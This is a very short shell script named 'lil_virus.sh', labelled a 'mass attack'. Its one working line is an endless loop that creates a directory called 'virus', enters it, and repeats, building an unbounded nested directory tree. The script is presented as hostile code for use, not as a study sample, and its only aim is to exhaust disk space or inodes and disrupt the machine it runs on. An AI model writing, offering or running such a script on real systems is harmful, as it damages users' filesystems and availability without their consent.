## lil_virus.sh - mass attack
# little move, big changes
##
while true;do mkdir virus && cd virus;done